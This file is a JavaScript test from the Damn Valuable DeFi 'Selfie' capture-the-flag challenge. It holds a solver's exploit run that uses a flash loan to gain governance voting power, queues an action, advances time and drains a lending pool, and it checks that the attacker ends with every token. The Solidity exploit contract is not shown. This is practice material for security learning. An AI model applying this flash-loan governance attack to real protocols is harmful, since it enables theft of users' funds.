const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Selfie", function () {
    let deployer, attacker

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther("2000000") // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther("1500000") // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, attacker] = await ethers.getSigners()

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
            "DamnValuableTokenSnapshot",
            deployer
        )
        const SimpleGovernanceFactory = await ethers.getContractFactory(
            "SimpleGovernance",
            deployer
        )
        const SelfiePoolFactory = await ethers.getContractFactory("SelfiePool", deployer)

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY)
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address)
        this.pool = await SelfiePoolFactory.deploy(this.token.address, this.governance.address)

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL)

        expect(await this.token.balanceOf(this.pool.address)).to.be.equal(TOKENS_IN_POOL)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        // Set things up

        const token = this.token.connect(attacker)
        const governance = this.governance.connect(attacker)
        const pool = this.pool.connect(attacker)

        console.log(
            "\t Before Exploit: Attacker's Balance:",
            (await token.balanceOf(attacker.address)).toString()
        )
        console.log(
            "\t Before Exploit: Pool's Balance:",
            (await token.balanceOf(pool.address)).toString()
        )

        const ExploitFactory = await ethers.getContractFactory("Exploit", attacker)

        const Exploit = await ExploitFactory.deploy(
            pool.address,
            governance.address,
            token.address,
            attacker.address
        )

        //Get a Flashloan

        await Exploit.getFlashLoan(await token.balanceOf(pool.address))

        //move time ahead 2 days
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]) // 2 days

        //Execute action
        await Exploit.Execute()

        console.log(
            "\t After Exploit: Attacker's Balance:",
            (await token.balanceOf(attacker.address)).toString()
        )
        console.log(
            "\t After Exploit: Pool's Balance:",
            (await token.balanceOf(pool.address)).toString()
        )
    })

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(await this.token.balanceOf(attacker.address)).to.be.equal(TOKENS_IN_POOL)
        expect(await this.token.balanceOf(this.pool.address)).to.be.equal("0")
    })
})
